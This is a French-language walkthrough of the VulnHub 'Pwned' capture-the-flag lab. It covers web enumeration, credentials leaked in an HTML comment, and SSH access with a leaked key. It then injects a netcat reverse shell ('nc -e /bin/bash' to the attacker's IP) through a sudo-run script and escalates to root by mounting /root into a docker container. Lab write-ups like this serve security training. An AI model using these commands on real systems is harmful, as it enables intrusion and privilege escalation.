---
title: "Solution du CTF Pwned de VulnHub"
tags: [CTF,VulnHub]
---

[Pwned](https://vulnhub.com/entry/pwned-1,507/) est un CTF créé par *Ajs Walker* et publié sur *VulnHub* en juillet 2020.

L'énumération initiale requiert une grosse wordlist. Pour la suite, on aura à exploiter un script custom puis exploiter une escalade de privilèges classique.

## Secrets hide in comments

On a trois ports ouverts dont un FTP qui nous renvoie une erreur 530 dès l'envoi d'un nom d'utilisateur.

```
Nmap scan report for 192.168.56.219
Host is up (0.00027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /robots.txt: Robots file
```

Le fichier `robots.txt` du serveur web ne retourne rien ou presque :

```console
curl http://192.168.56.219/robots.txt
# Group 1

User-agent: *
Allow: /nothing
```

Effectivement on ne trouve rien d'intéressant dans ce dossier `nothing`.

On trouve un message dans la page d'index, mais rien qui puisse nous aider.

```html
        A last note from Attacker :)

                   I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them. 
                   Now they worry about this. Before finding me investigate your employees first. (LOL) then find me Boomers XD..!!
            </pre>
 </p>
</body>
</html> 
<!-- I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it  -->
```

Finalement avec une grosse wordlist je trouve un dossier supplémentaire.

```console
$ feroxbuster -u http://192.168.56.219/ -w directory-list-2.3-big.txt -n -C 279

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.219/
 🚀  Threads               │ 50
 📖  Wordlist              │ directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [279]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      318c http://192.168.56.219/nothing
301        9l       28w      322c http://192.168.56.219/hidden_text
403        9l       28w      279c http://192.168.56.219/server-status
```

Sous `hidden_text` se trouve un fichier `secret.dic` dont voici le contenu :

```
/hacked
/vanakam_nanba
/hackerman.gif 
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg 
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
```

Au lieu de tester les paths manuellement on va se servir de `ffuf` :

```console
$ ffuf -u http://192.168.56.219/FUZZ -w secret.dic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.219/FUZZ
 :: Wordlist         : FUZZ: secret.dic
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

/pwned.vuln             [Status: 301, Size: 321, Words: 20, Lines: 10]
                        [Status: 200, Size: 3065, Words: 1523, Lines: 76]
:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

On trouve une autre page web avec des identifiants en commentaire :

```html
<body>
		<div id="main">
			<h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
			<form method="POST">
			Username <input type="text" name="username" class="text" autocomplete="off" required>
			Password <input type="password" name="password" class="text" required>
			<input type="submit" name="submit" id="sub">
			</form>
			</div>
</body>
</html>
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>
```

Cette fois ça y est, on peut se connecter au FTP et récupérer deux fichiers :

```console
$ ftp 192.168.56.219
Connected to 192.168.56.219.
220 (vsFTPd 3.0.3)
Name (192.168.56.219:devloop): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||59132|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||26995|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
```

Le premier mentionne un nom d'utilisateur :

> Wow you are here
> 
> ariana won't happy about this note
> 
> sorry ariana :(

L'autre est la clé SSH qui nous ouvre la porte du SSH :

```console
$ ssh -i id_rsa ariana@192.168.56.219
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

ariana@pwned:~$ id
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
ariana@pwned:~$ ls -a
.  ..  ariana-personal.diary  .bash_history  .bash_logout  .bashrc  .local  .profile  .ssh  user1.txt
ariana@pwned:~$ cat user1.txt 
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

## This message will execute in 3 seconds

> Its Ariana personal Diary :::  
> 
> Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.

Le compte `ariana` est autorisé à exécuter un script bash avec le compte `selena` :

```console
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
ariana@pwned:~$ ls -l /home/messenger.sh
-rwxr-xr-x 1 root root 367 Jul 10  2020 /home/messenger.sh
ariana@pwned:~$ cat /home/messenger.sh
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name 
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""

```

On voit que la variable `$msg` est exécutée comme une commande. Une fois le script lancé (`sudo -u selena /home/messenger.sh`) on peut remplir le formulaire :

```
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : yolo

Enter message for yolo :nc -e /bin/bash 192.168.56.1 9999

Sending message to yolo
```

J'obtiens mon shell sur mon `ncat` :

```console
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.219.
Ncat: Connection from 192.168.56.219:43400.
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

Je le rattache à un pseudo terminal, pour ça j'utilise la commande suivante dans le shell :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Je fais ensuite un `Ctrl+Z` pour suspendre le processus, je tape  `stty raw -echo`  pour désactiver l'écho de mes commandes dans la console,  `fg %1` pour que le processus reprenne et enfin  `reset` dans le shell distant pour que les changements soient bien appliqués.

```console
selena@pwned:~$ cat user2.txt
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

Rien de plus dans le dossier de l'utilisatrice, mais cette dernière fait partie du groupe `docker` :

```console
selena@pwned:~$ docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
c12a56960efa        privesc             "/bin/bash"         2 years ago         Exited (139) 2 years ago                       nostalgic_jepsen
83934b2936a9        privesc             "/bin/bash"         2 years ago         Exited (139) 2 years ago                       gracious_euclid
1e310adf4c37        e13ad046d435        "/bin/bash"         2 years ago         Exited (139) 2 years ago                       trusting_montalcini
c19299e7db7c        e13ad046d435        "/bin/bash"         2 years ago         Exited (139) 2 years ago                       angry_villani
c84a0a8edab1        e13ad046d435        "/bin/bash"         2 years ago         Exited (139) 2 years ago                       serene_davinci
selena@pwned:~$ docker images -a
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        2 years ago         88.3MB
<none>              <none>              8d96fec8d3cd        2 years ago         88.3MB
<none>              <none>              f865e2e37392        2 years ago         88.3MB
<none>              <none>              31de1ff96226        2 years ago         88.3MB
<none>              <none>              2f0005b6fa4a        2 years ago         88.3MB
<none>              <none>              23faf61cd1d9        2 years ago         88.3MB
<none>              <none>              e13ad046d435        2 years ago         88.3MB
<none>              <none>              34f386be0bda        2 years ago         88.3MB
alpine              latest              a24bb4013296        2 years ago         5.57MB
debian              wheezy              10fcec6d95c4        4 years ago         88.3MB
```

On va profiter de l'image Alpine pour créer un container qui aura accès à `/root` :

```console
selena@pwned:~$ docker run -v /root:/data -it --rm alpine /bin/sh
/ # cd /data
/data # ls
root.txt
/data # cat root.txt
4d4098d64e163d2726959455d046fd7c



You found me. i dont't expect this （◎ . ◎）
I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker 

Twitter    Ajs_walker
```
